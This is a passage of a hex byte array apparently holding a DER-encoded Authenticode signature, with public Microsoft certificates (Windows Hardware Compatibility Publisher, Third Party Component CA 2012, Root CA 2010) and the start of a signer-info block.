		0x31, 0x3B, 0x30, 0x39, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x32, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x48, 0x61, 0x72, 0x64, 0x77, 0x61, 0x72, 0x65, 0x20, 0x43, 0x6F,
		0x6D, 0x70, 0x61, 0x74, 0x69, 0x62, 0x69, 0x6C, 0x69, 0x74, 0x79, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x73, 0x68, 0x65, 0x72, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00,
		0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02, 0x82, 0x01, 0x01, 0x00, 0xA2, 0xD2, 0x93, 0x7A, 0x06, 0x61, 0x5D, 0xFC, 0x3F, 0x2F, 0x80, 0x6E, 0x69, 0x5D, 0x3B, 0xFD, 0x52, 0x24, 0x41, 0xD5, 0xF3, 0x2D, 0x8D, 0xBE, 0xC6, 0x03,
		0x99, 0x7C, 0x29, 0x4D, 0x75, 0x54, 0x39, 0xE9, 0xF9, 0x8E, 0x16, 0xB5, 0xAE, 0x2D, 0x07, 0x08, 0x65, 0xF6, 0x3E, 0x4C, 0xF5, 0xEC, 0xA5, 0x2B, 0x4F, 0x2B, 0xD6, 0x66, 0xFF, 0x6A, 0x73, 0x78, 0x09, 0x53, 0xAC, 0xF5, 0x1B, 0xA5, 0xBF, 0xFA,
		0x4A, 0x84, 0xBD, 0x65, 0xD1, 0xF2, 0x98, 0x01, 0x2D, 0xE5, 0xE4, 0x0D, 0x8C, 0x56, 0x6A, 0xE4, 0x7F, 0xC9, 0x4F, 0x88, 0xD0, 0x5B, 0xDC, 0xF6, 0x7D, 0x69, 0x14, 0x13, 0x72, 0x52, 0x9E, 0x4B, 0xDA, 0x28, 0x95, 0xCA, 0xE1, 0x7D, 0x68, 0x58,
		0xBE, 0x5D, 0x71, 0xF5, 0x12, 0x46, 0xA6, 0xB0, 0x0F, 0x95, 0x1A, 0xFF, 0x7F, 0x26, 0x6D, 0xB6, 0xC0, 0x91, 0x25, 0x51, 0x82, 0xC6, 0xD1, 0xAE, 0x67, 0x1B, 0xE7, 0x75, 0x54, 0x6A, 0x3D, 0x98, 0x58, 0x27, 0x58, 0x45, 0x89, 0xAA, 0x7E, 0x6B,
		0x3C, 0xD7, 0x82, 0x6B, 0x76, 0x65, 0xA2, 0x0A, 0x07, 0x4F, 0x86, 0xC3, 0x7E, 0x67, 0x7E, 0xCA, 0xF3, 0xB4, 0xE4, 0x0C, 0x2B, 0xFF, 0x88, 0x76, 0x72, 0x74, 0x81, 0x9B, 0xEC, 0xE6, 0xD4, 0xFA, 0xA1, 0xD4, 0xB9, 0xE5, 0xB6, 0xDF, 0xBE, 0x20,
		0x23, 0x5A, 0x0D, 0x52, 0xA0, 0xFC, 0xC9, 0x9E, 0x54, 0xBA, 0x6B, 0x14, 0x9B, 0xD0, 0x7D, 0x7C, 0xD8, 0x41, 0x0B, 0x4B, 0x50, 0x29, 0xB3, 0x59, 0xBB, 0xE4, 0x39, 0x30, 0x24, 0xB8, 0x02, 0x64, 0x6D, 0x10, 0xAE, 0xE4, 0x9E, 0x47, 0xCA, 0x86,
		0x3E, 0x3F, 0xF5, 0x49, 0x0B, 0x89, 0x20, 0x3A, 0xA1, 0xC8, 0x75, 0x75, 0x25, 0xFA, 0xB9, 0x66, 0xCA, 0x2B, 0xD5, 0xEE, 0x6F, 0x03, 0x94, 0x53, 0x3A, 0xF4, 0x04, 0x36, 0xFD, 0x31, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x82, 0x01, 0xCB, 0x30,
		0x82, 0x01, 0xC7, 0x30, 0x2B, 0x06, 0x03, 0x55, 0x1D, 0x25, 0x04, 0x24, 0x30, 0x22, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x0A, 0x03, 0x27, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x0A, 0x03, 0x05, 0x06, 0x08,
		0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x03, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14, 0x6C, 0x22, 0x3D, 0xF5, 0x73, 0x52, 0x82, 0xCC, 0xDE, 0xDA, 0x03, 0x41, 0xBF, 0xCD, 0x94, 0xDE, 0x03, 0xF4, 0x96, 0x0C, 0x30,
		0x50, 0x06, 0x03, 0x55, 0x1D, 0x11, 0x04, 0x49, 0x30, 0x47, 0xA4, 0x45, 0x30, 0x43, 0x31, 0x29, 0x30, 0x27, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x20, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x4F, 0x70, 0x65, 0x72, 0x61,
		0x74, 0x69, 0x6F, 0x6E, 0x73, 0x20, 0x50, 0x75, 0x65, 0x72, 0x74, 0x6F, 0x20, 0x52, 0x69, 0x63, 0x6F, 0x31, 0x16, 0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x05, 0x13, 0x0D, 0x32, 0x33, 0x32, 0x38, 0x32, 0x35, 0x2B, 0x34, 0x36, 0x39, 0x35, 0x38,
		0x30, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x61, 0x71, 0xA7, 0x87, 0xAF, 0xFF, 0x69, 0xD5, 0x21, 0x76, 0x4F, 0x52, 0x93, 0x28, 0x00, 0xBE, 0x79, 0x12, 0xAB, 0x84, 0x30, 0x74, 0x06, 0x03, 0x55, 0x1D,
		0x1F, 0x04, 0x6D, 0x30, 0x6B, 0x30, 0x69, 0xA0, 0x67, 0xA0, 0x65, 0x86, 0x63, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x70, 0x6B,
		0x69, 0x6F, 0x70, 0x73, 0x2F, 0x63, 0x72, 0x6C, 0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x25, 0x32, 0x30, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x25, 0x32, 0x30, 0x54, 0x68, 0x69, 0x72, 0x64, 0x25, 0x32, 0x30, 0x50,
		0x61, 0x72, 0x74, 0x79, 0x25, 0x32, 0x30, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x25, 0x32, 0x30, 0x43, 0x41, 0x25, 0x32, 0x30, 0x32, 0x30, 0x31, 0x32, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x81, 0x81, 0x06, 0x08, 0x2B, 0x06, 0x01,
		0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x75, 0x30, 0x73, 0x30, 0x71, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x02, 0x86, 0x65, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73,
		0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x70, 0x6B, 0x69, 0x6F, 0x70, 0x73, 0x2F, 0x63, 0x65, 0x72, 0x74, 0x73, 0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x25, 0x32, 0x30, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73,
		0x25, 0x32, 0x30, 0x54, 0x68, 0x69, 0x72, 0x64, 0x25, 0x32, 0x30, 0x50, 0x61, 0x72, 0x74, 0x79, 0x25, 0x32, 0x30, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x25, 0x32, 0x30, 0x43, 0x41, 0x25, 0x32, 0x30, 0x32, 0x30, 0x31, 0x32,
		0x2E, 0x63, 0x72, 0x74, 0x30, 0x0C, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04, 0x02, 0x30, 0x00, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x61, 0xB2,
		0x1F, 0xE5, 0x89, 0x14, 0x21, 0x22, 0x8F, 0x4B, 0xF8, 0x1E, 0xF5, 0xA0, 0x90, 0x05, 0xD4, 0x50, 0x86, 0x0E, 0x55, 0xD2, 0x01, 0x32, 0x53, 0xF0, 0xC9, 0x24, 0x06, 0x31, 0xC0, 0x8E, 0x16, 0x43, 0x15, 0x6B, 0x71, 0xE6, 0x0B, 0xF9, 0xC7, 0x8B,
		0x9B, 0x11, 0x62, 0x27, 0xCE, 0xCE, 0x4C, 0xF7, 0x69, 0xC6, 0x9E, 0x06, 0xB3, 0x06, 0x61, 0x4C, 0xEC, 0xFB, 0x42, 0x1E, 0x11, 0xB4, 0x6F, 0x30, 0x74, 0xBF, 0xF1, 0xE8, 0xA5, 0x79, 0x25, 0xAA, 0x14, 0x5C, 0x7B, 0x18, 0xB8, 0x12, 0x89, 0x99,
		0x08, 0xDB, 0x23, 0x24, 0x37, 0xF0, 0xF4, 0x4D, 0x48, 0x61, 0x54, 0x4A, 0x96, 0xEE, 0x3E, 0x40, 0xB0, 0x29, 0x35, 0x65, 0x9E, 0x28, 0x1C, 0x2F, 0xFC, 0x5C, 0xB0, 0x4E, 0x92, 0xEB, 0x6D, 0xB5, 0x6B, 0xD3, 0x5A, 0x91, 0x92, 0x27, 0x43, 0x0E,
		0xE7, 0x20, 0x19, 0xC2, 0xD2, 0xF0, 0xDE, 0xB3, 0xF8, 0xD0, 0xB6, 0x6B, 0x21, 0x33, 0x67, 0xD4, 0x23, 0x11, 0xBB, 0xD5, 0x59, 0xB2, 0x0E, 0xCE, 0x3A, 0x2F, 0x89, 0x66, 0xC6, 0xB7, 0x6E, 0xBF, 0xC8, 0x45, 0x2F, 0xB4, 0xAB, 0x79, 0xD5, 0xC4,
		0x73, 0x4C, 0xB3, 0x5D, 0x63, 0x98, 0x38, 0xA7, 0x3D, 0x65, 0x62, 0x6D, 0x0A, 0x9B, 0xB5, 0x12, 0xEE, 0xBA, 0x08, 0x4E, 0xCE, 0x0F, 0x8D, 0xEB, 0x22, 0x9C, 0xFB, 0x98, 0xD4, 0x3B, 0xCD, 0xEC, 0x55, 0x75, 0x79, 0x2F, 0x7A, 0xF7, 0x16, 0x98,
		0xC4, 0x61, 0x8D, 0xB5, 0xB2, 0x72, 0x3D, 0x39, 0xFF, 0xEE, 0x82, 0x9B, 0x00, 0xA9, 0x6B, 0x14, 0xF7, 0x4E, 0xDD, 0x56, 0x04, 0x49, 0xB0, 0x40, 0xA7, 0x61, 0x1F, 0x7E, 0x1B, 0x16, 0xD9, 0xD3, 0x76, 0x35, 0x01, 0xBE, 0xC9, 0xC4, 0x83, 0xA7,
		0x3E, 0x63, 0xF1, 0x91, 0xD2, 0x6B, 0x29, 0x02, 0xD8, 0x79, 0xC0, 0x61, 0x20, 0x40, 0x30, 0x82, 0x05, 0xE1, 0x30, 0x82, 0x03, 0xC9, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x0A, 0x61, 0x0B, 0xAA, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x30,
		0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x30, 0x81, 0x88, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13,
		0x0A, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6E, 0x67, 0x74, 0x6F, 0x6E, 0x31, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64, 0x6D, 0x6F, 0x6E, 0x64, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15,
		0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x32, 0x30, 0x30, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x29, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66,
		0x74, 0x20, 0x52, 0x6F, 0x6F, 0x74, 0x20, 0x43, 0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x65, 0x20, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x20, 0x32, 0x30, 0x31, 0x30, 0x30, 0x1E, 0x17, 0x0D, 0x31, 0x32, 0x30,
		0x34, 0x31, 0x38, 0x32, 0x33, 0x34, 0x38, 0x33, 0x38, 0x5A, 0x17, 0x0D, 0x32, 0x37, 0x30, 0x34, 0x31, 0x38, 0x32, 0x33, 0x35, 0x38, 0x33, 0x38, 0x5A, 0x30, 0x81, 0x8E, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55,
		0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0A, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6E, 0x67, 0x74, 0x6F, 0x6E, 0x31, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64, 0x6D, 0x6F, 0x6E, 0x64,
		0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x38, 0x30, 0x36, 0x06, 0x03, 0x55, 0x04,
		0x03, 0x13, 0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x54, 0x68, 0x69, 0x72, 0x64, 0x20, 0x50, 0x61, 0x72, 0x74, 0x79, 0x20, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65,
		0x6E, 0x74, 0x20, 0x43, 0x41, 0x20, 0x32, 0x30, 0x31, 0x32, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02, 0x82,
		0x01, 0x01, 0x00, 0xA3, 0x9C, 0x30, 0x84, 0x09, 0xA7, 0x63, 0x2E, 0xCF, 0x0A, 0x47, 0xF0, 0xEA, 0x24, 0xF9, 0xA3, 0x30, 0x20, 0x0F, 0x5E, 0x57, 0x31, 0x26, 0x81, 0x9A, 0x31, 0x07, 0xB2, 0x50, 0xD4, 0xCE, 0x67, 0x09, 0x08, 0x65, 0x0A, 0x5A,
		0xA5, 0x4B, 0xAE, 0xD5, 0xED, 0x10, 0x2E, 0xE7, 0xA5, 0x99, 0xB5, 0x9F, 0x68, 0x2F, 0x98, 0x8B, 0x58, 0x02, 0xAC, 0x20, 0xB4, 0x29, 0xC4, 0x71, 0xBD, 0x28, 0x1C, 0xA5, 0xFD, 0x3C, 0x9B, 0x64, 0xE4, 0xC5, 0xEB, 0xDF, 0x61, 0x25, 0xBC, 0xF0,
		0xEE, 0x68, 0xBF, 0xD1, 0xA7, 0xCB, 0x7E, 0x2A, 0x02, 0x81, 0x4E, 0x64, 0x5C, 0x0C, 0x53, 0x86, 0x79, 0x57, 0x19, 0x37, 0x61, 0xB7, 0x98, 0xF9, 0x0C, 0xA0, 0x4E, 0x22, 0x59, 0x9B, 0xF9, 0x1B, 0x2D, 0x67, 0x3C, 0x27, 0x3C, 0x56, 0x90, 0x66,
		0xE3, 0xFD, 0x7F, 0x65, 0x7D, 0x0F, 0x86, 0xBD, 0x35, 0x47, 0xE8, 0x8A, 0xCC, 0xF4, 0xDA, 0x8E, 0xE9, 0x6A, 0x4E, 0xAB, 0xA7, 0x55, 0xEC, 0xA2, 0x89, 0x1E, 0xD5, 0x33, 0x45, 0x53, 0xCB, 0xF9, 0x9E, 0x77, 0xBD, 0xCD, 0x2C, 0xF9, 0x05, 0xB8,
		0x7F, 0x74, 0x01, 0x1D, 0xE8, 0xFB, 0x18, 0xE1, 0x43, 0xD1, 0x0D, 0xE9, 0xAA, 0xDC, 0x37, 0x6F, 0xBD, 0xFE, 0xB8, 0x0F, 0xED, 0x1D, 0x4D, 0x01, 0x46, 0x4E, 0x0A, 0xAC, 0xFC, 0x82, 0xE8, 0xEC, 0x56, 0x83, 0x13, 0x8E, 0x3A, 0x01, 0xED, 0x14,
		0x64, 0x74, 0xEA, 0x64, 0xB2, 0x66, 0x10, 0xB6, 0x68, 0x6D, 0xC8, 0x70, 0x00, 0x7D, 0x50, 0x48, 0x2E, 0x3D, 0x43, 0xEE, 0xE0, 0x24, 0x95, 0xC6, 0xCD, 0x8E, 0xC7, 0xFD, 0xB8, 0xE4, 0x95, 0xCF, 0xDD, 0x7E, 0xFB, 0x95, 0x5E, 0xA1, 0x01, 0xCD,
		0x43, 0xB1, 0x07, 0xD7, 0xA4, 0x30, 0xEE, 0x9B, 0x86, 0x1A, 0x2A, 0x6E, 0xC1, 0x0B, 0x59, 0xA2, 0x74, 0x6F, 0x8B, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x82, 0x01, 0x43, 0x30, 0x82, 0x01, 0x3F, 0x30, 0x10, 0x06, 0x09, 0x2B, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x15, 0x01, 0x04, 0x03, 0x02, 0x01, 0x00, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14, 0x61, 0x71, 0xA7, 0x87, 0xAF, 0xFF, 0x69, 0xD5, 0x21, 0x76, 0x4F, 0x52, 0x93, 0x28, 0x00, 0xBE, 0x79, 0x12, 0xAB,
		0x84, 0x30, 0x19, 0x06, 0x09, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x04, 0x0C, 0x1E, 0x0A, 0x00, 0x53, 0x00, 0x75, 0x00, 0x62, 0x00, 0x43, 0x00, 0x41, 0x30, 0x0B, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x04, 0x04, 0x03, 0x02, 0x01,
		0x86, 0x30, 0x0F, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04, 0x05, 0x30, 0x03, 0x01, 0x01, 0xFF, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0xD5, 0xF6, 0x56, 0xCB, 0x8F, 0xE8, 0xA2, 0x5C, 0x62,
		0x68, 0xD1, 0x3D, 0x94, 0x90, 0x5B, 0xD7, 0xCE, 0x9A, 0x18, 0xC4, 0x30, 0x56, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x4F, 0x30, 0x4D, 0x30, 0x4B, 0xA0, 0x49, 0xA0, 0x47, 0x86, 0x45, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x63, 0x72, 0x6C,
		0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x70, 0x6B, 0x69, 0x2F, 0x63, 0x72, 0x6C, 0x2F, 0x70, 0x72, 0x6F, 0x64, 0x75, 0x63, 0x74, 0x73, 0x2F, 0x4D, 0x69, 0x63, 0x52, 0x6F, 0x6F, 0x43, 0x65,
		0x72, 0x41, 0x75, 0x74, 0x5F, 0x32, 0x30, 0x31, 0x30, 0x2D, 0x30, 0x36, 0x2D, 0x32, 0x33, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x5A, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x4E, 0x30, 0x4C, 0x30, 0x4A, 0x06, 0x08, 0x2B,
		0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x02, 0x86, 0x3E, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x70, 0x6B, 0x69, 0x2F, 0x63, 0x65,
		0x72, 0x74, 0x73, 0x2F, 0x4D, 0x69, 0x63, 0x52, 0x6F, 0x6F, 0x43, 0x65, 0x72, 0x41, 0x75, 0x74, 0x5F, 0x32, 0x30, 0x31, 0x30, 0x2D, 0x30, 0x36, 0x2D, 0x32, 0x33, 0x2E, 0x63, 0x72, 0x74, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7,
		0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x03, 0x82, 0x02, 0x01, 0x00, 0x5A, 0x8A, 0x67, 0xDA, 0xCC, 0xD5, 0xFD, 0x0D, 0x26, 0x41, 0x77, 0xBF, 0x0A, 0x46, 0x78, 0xB4, 0xB3, 0xDE, 0x12, 0x69, 0x2B, 0x77, 0x23, 0xC2, 0x65, 0x2F, 0x01, 0x5F, 0xD2,
		0x03, 0xF4, 0x61, 0xBA, 0x50, 0x9D, 0x2E, 0x8C, 0x39, 0x72, 0xF3, 0x6C, 0x3E, 0x6A, 0xB1, 0x1E, 0x76, 0x6D, 0xEC, 0xB7, 0xF3, 0x82, 0xDC, 0xCC, 0xBB, 0xC5, 0x69, 0x70, 0x28, 0x73, 0x66, 0x17, 0x3F, 0x54, 0xEB, 0xEE, 0x01, 0x16, 0x48, 0xC4,
		0x46, 0xD9, 0x1B, 0x80, 0xAE, 0x81, 0x3A, 0x8D, 0x0F, 0x79, 0x6D, 0x68, 0xB0, 0x9E, 0xEA, 0x2D, 0x3F, 0x39, 0xD3, 0xCA, 0x38, 0x7E, 0xBD, 0x5E, 0x7C, 0x08, 0x6E, 0x19, 0xDC, 0xC6, 0xC2, 0xF4, 0x38, 0x33, 0x68, 0x61, 0xE2, 0x52, 0x47, 0x83,
		0xE1, 0x00, 0x01, 0x56, 0xD2, 0xBA, 0xCB, 0x87, 0x82, 0x05, 0x31, 0x0A, 0x41, 0x8B, 0x4E, 0xE7, 0x7F, 0x5F, 0x5F, 0xED, 0x5F, 0xD3, 0x39, 0x2D, 0x45, 0xEB, 0xA2, 0x13, 0xBF, 0xFD, 0x1E, 0xC2, 0x98, 0x41, 0x71, 0x61, 0x16, 0x5F, 0xC8, 0x0A,
		0x70, 0x25, 0x7C, 0x59, 0x69, 0x31, 0x24, 0xE4, 0x71, 0xE7, 0x0A, 0xBB, 0x04, 0x17, 0xF7, 0x9F, 0x72, 0x1E, 0xC9, 0xD2, 0xBB, 0x1A, 0xBE, 0x3D, 0x02, 0xFE, 0x09, 0x0C, 0xB2, 0x43, 0xB4, 0x59, 0x1A, 0x99, 0x53, 0x93, 0x96, 0x21, 0x5F, 0xE0,
		0xD6, 0xB7, 0x26, 0x01, 0x42, 0x95, 0x36, 0xAC, 0x27, 0xFD, 0xBE, 0xF4, 0x85, 0x77, 0x68, 0x3D, 0x18, 0xBD, 0xF4, 0xBE, 0x98, 0x88, 0x22, 0x11, 0x86, 0x52, 0x16, 0xF3, 0x45, 0xEC, 0x03, 0x97, 0x10, 0x70, 0x87, 0xA3, 0x70, 0x43, 0x71, 0x3C,
		0xDB, 0xC9, 0x86, 0x03, 0x17, 0x0C, 0xF5, 0x73, 0x5B, 0xC6, 0x7D, 0xE1, 0x5C, 0x64, 0xED, 0xD7, 0xC5, 0x48, 0xD7, 0xED, 0x32, 0xE2, 0xD1, 0xAA, 0xD3, 0xCF, 0xA7, 0xF6, 0x57, 0x4E, 0x61, 0xF9, 0x77, 0xEB, 0x67, 0xF2, 0x88, 0xB3, 0xDE, 0x00,
		0xDA, 0x03, 0x8F, 0xD0, 0x8A, 0x34, 0x37, 0x3E, 0x1D, 0xD8, 0x62, 0xB8, 0xD2, 0xB1, 0xF3, 0xE1, 0x2F, 0x8B, 0x72, 0x3B, 0x81, 0x96, 0x7C, 0x6F, 0xFC, 0xEC, 0x66, 0x76, 0x72, 0x60, 0x1B, 0x24, 0xF2, 0xA0, 0x89, 0x6D, 0x5B, 0x6D, 0x00, 0x2E,
		0xEF, 0x28, 0xDD, 0x86, 0x87, 0x05, 0xC2, 0xB4, 0xB9, 0xE5, 0xBE, 0x64, 0xC2, 0x2A, 0xF2, 0x4A, 0x15, 0x5C, 0x98, 0xE2, 0xC4, 0x27, 0x85, 0xFF, 0x52, 0xE3, 0x62, 0x7E, 0x0F, 0xB2, 0x02, 0x0B, 0xD7, 0x66, 0xC7, 0x0A, 0xB2, 0xD3, 0x3D, 0x20,
		0x04, 0x14, 0x50, 0x32, 0x59, 0x83, 0x0A, 0x7D, 0x9B, 0xED, 0x5A, 0x38, 0x12, 0x01, 0x52, 0xBA, 0x2F, 0x5E, 0x20, 0x72, 0x8E, 0x4A, 0xF1, 0xFD, 0xE7, 0x71, 0x02, 0x8C, 0x3B, 0xE1, 0x07, 0xBE, 0xC9, 0x73, 0xF4, 0xDD, 0x47, 0xD8, 0xB4, 0xEF,
		0xB4, 0xA4, 0xB3, 0x30, 0xB9, 0x89, 0x3E, 0x76, 0xCA, 0xB9, 0x00, 0x98, 0x56, 0x7E, 0xAB, 0xEA, 0x8A, 0xB8, 0xA5, 0xD0, 0x38, 0xAB, 0x69, 0x77, 0x13, 0x0B, 0x14, 0x2F, 0xE9, 0xAA, 0x41, 0x1F, 0xF7, 0xBA, 0xBD, 0x3A, 0x2B, 0x34, 0x8A, 0xEE,
		0x0A, 0xAB, 0x63, 0xE6, 0x63, 0xF7, 0x88, 0x24, 0x8E, 0x20, 0x0D, 0x2B, 0x3B, 0x9D, 0xE3, 0xC2, 0x49, 0x52, 0xAC, 0x9F, 0x1F, 0x0E, 0x39, 0x3B, 0x5D, 0xD4, 0x6E, 0x50, 0x6A, 0xE6, 0x7D, 0x52, 0x3A, 0xAA, 0x7C, 0x33, 0x15, 0x29, 0x0D, 0x26,
		0x5E, 0x01, 0x58, 0xA7, 0x4E, 0xA9, 0x3D, 0x7A, 0x84, 0x6F, 0x74, 0x3F, 0x60, 0x9F, 0xE4, 0x32, 0x4F, 0x36, 0x00, 0xAF, 0x6D, 0x71, 0xD3, 0x3E, 0xA6, 0x46, 0x65, 0x5F, 0x81, 0x74, 0xF1, 0xFE, 0xC1, 0x71, 0xDA, 0x4C, 0xA0, 0x41, 0x5A, 0x82,
		0xDD, 0xF1, 0x1F, 0x31, 0x82, 0x19, 0xFC, 0x30, 0x82, 0x19, 0xF8, 0x02, 0x01, 0x01, 0x30, 0x81, 0xA6, 0x30, 0x81, 0x8E, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55,
		0x04, 0x08, 0x13, 0x0A, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6E, 0x67, 0x74, 0x6F, 0x6E, 0x31, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64, 0x6D, 0x6F, 0x6E, 0x64, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04,
		0x0A, 0x13, 0x15, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x38, 0x30, 0x36, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F,
		0x73, 0x6F, 0x66, 0x74, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x54, 0x68, 0x69, 0x72, 0x64, 0x20, 0x50, 0x61, 0x72, 0x74, 0x79, 0x20, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x20, 0x43, 0x41, 0x20, 0x32, 0x30,
